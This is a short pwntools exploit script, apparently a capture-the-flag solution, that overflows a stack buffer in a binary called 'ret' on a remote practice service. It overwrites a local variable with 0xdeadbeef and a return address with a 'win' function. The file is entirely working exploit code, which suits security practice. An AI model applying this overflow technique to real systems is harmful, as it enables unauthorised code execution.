from pwn import *

f = context.binary = ELF('ret')
#io = f.process()
io = remote("ctf.hackucf.org", 9003)
# pack 0xdeadbeef in to local int at offset 64 and addresss of win at offset 80
payload = fit({
    64: 0xdeadbeef,
    80: 0x080491fa
})

print(payload)
io.sendline(payload)
io.interactive()

